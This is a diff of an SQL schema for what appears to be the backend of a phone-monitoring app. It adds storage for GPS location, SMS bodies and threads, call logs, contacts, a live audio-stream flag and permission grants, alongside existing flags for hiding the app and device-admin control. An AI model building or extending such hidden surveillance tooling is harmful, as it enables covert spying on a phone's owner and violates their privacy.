@@ -19,6 +19,28 @@ CREATE TABLE IF NOT EXISTS devices (
     pending_device_token TEXT,
     device_token_sealed TEXT,
     device_admin_active INTEGER NOT NULL DEFAULT 0,
+    last_wifi_ssid TEXT,
+    geofence_ok INTEGER,
+    usage_summary_json TEXT,
+    battery_summary_json TEXT,
+    usage_summary_at INTEGER,
+    battery_summary_at INTEGER,
+    last_latitude REAL,
+    last_longitude REAL,
+    last_location_accuracy REAL,
+    last_location_at INTEGER,
+    location_permission_granted INTEGER,
+    last_location_provider TEXT,
+    last_location_altitude REAL,
+    last_location_speed REAL,
+    usage_access_granted INTEGER,
+    call_log_permission_granted INTEGER,
+    sms_permission_granted INTEGER,
+    contacts_permission_granted INTEGER,
+    audio_permission_granted INTEGER,
+    audio_stream_active INTEGER,
+    storage_permission_granted INTEGER,
+    notification_access_granted INTEGER,
     app_locked INTEGER NOT NULL DEFAULT 0,
     app_hidden INTEGER NOT NULL DEFAULT 0,
     registered INTEGER NOT NULL DEFAULT 1,
@@ -136,9 +158,12 @@ ON device_location_history (device_id, timestamp);
 CREATE TABLE IF NOT EXISTS device_call_history (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     device_id TEXT NOT NULL,
+    source_id TEXT NOT NULL DEFAULT '',
     phone_number TEXT NOT NULL DEFAULT '',
     contact_name TEXT NOT NULL DEFAULT '',
     call_type TEXT NOT NULL DEFAULT '',
+    country_iso TEXT NOT NULL DEFAULT '',
+    location_label TEXT NOT NULL DEFAULT '',
     duration_seconds INTEGER NOT NULL DEFAULT 0,
     timestamp INTEGER NOT NULL,
     FOREIGN KEY (device_id) REFERENCES devices(device_id)
@@ -148,14 +173,22 @@ CREATE INDEX IF NOT EXISTS idx_device_call_history_device_time
 ON device_call_history (device_id, timestamp);
 
 CREATE UNIQUE INDEX IF NOT EXISTS idx_device_call_history_unique
-ON device_call_history (device_id, timestamp, phone_number, call_type, duration_seconds);
+ON device_call_history (device_id, source_id);
+
+CREATE UNIQUE INDEX IF NOT EXISTS idx_device_call_history_fallback
+ON device_call_history (device_id, timestamp, phone_number, call_type, duration_seconds)
+WHERE source_id = '';
 
 CREATE TABLE IF NOT EXISTS device_sms_history (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     device_id TEXT NOT NULL,
+    source_id TEXT NOT NULL DEFAULT '',
     address TEXT NOT NULL DEFAULT '',
     body TEXT NOT NULL DEFAULT '',
     sms_type TEXT NOT NULL DEFAULT '',
+    read_state TEXT NOT NULL DEFAULT '',
+    thread_id TEXT NOT NULL DEFAULT '',
+    subject TEXT NOT NULL DEFAULT '',
     timestamp INTEGER NOT NULL,
     FOREIGN KEY (device_id) REFERENCES devices(device_id)
 );
@@ -164,7 +197,11 @@ CREATE INDEX IF NOT EXISTS idx_device_sms_history_device_time
 ON device_sms_history (device_id, timestamp);
 
 CREATE UNIQUE INDEX IF NOT EXISTS idx_device_sms_history_unique
-ON device_sms_history (device_id, timestamp, address, sms_type, body);
+ON device_sms_history (device_id, source_id);
+
+CREATE UNIQUE INDEX IF NOT EXISTS idx_device_sms_history_fallback
+ON device_sms_history (device_id, timestamp, address, sms_type, body)
+WHERE source_id = '';
 
 CREATE TABLE IF NOT EXISTS device_contacts (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
